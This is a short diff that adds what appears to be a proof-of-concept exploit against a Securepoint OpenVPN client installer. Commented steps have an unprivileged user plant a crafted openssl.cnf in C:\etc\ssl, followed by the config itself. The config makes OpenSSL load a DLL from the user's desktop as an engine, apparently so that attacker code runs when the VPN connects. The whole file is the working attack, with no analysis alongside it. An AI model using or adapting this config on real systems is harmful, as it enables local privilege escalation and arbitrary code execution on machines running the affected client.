@@ -1,0 +1,19 @@
+# openvpn-client-installer-2.0.34.exe 
+# C:\Users\nonpriv\Desktop>mkdir "C:\etc\ssl\"
+
+# C:\Users\nonpriv\Desktop>copy Securepoint_OpenVPN_2-0-34.cnf "C:\etc\ssl\openssl.cnf"
+#        1 file(s) copied.
+#
+# then connect to your vpn.
+
+openssl_conf = openssl_init
+[openssl_init]
+engines = engine_section
+
+[engine_section]
+cmd = cmd_section
+
+[cmd_section]
+engine_id = cmd
+dynamic_path = c:\\Users\\nonpriv\\Desktop\\lalo.dll
+init = 0
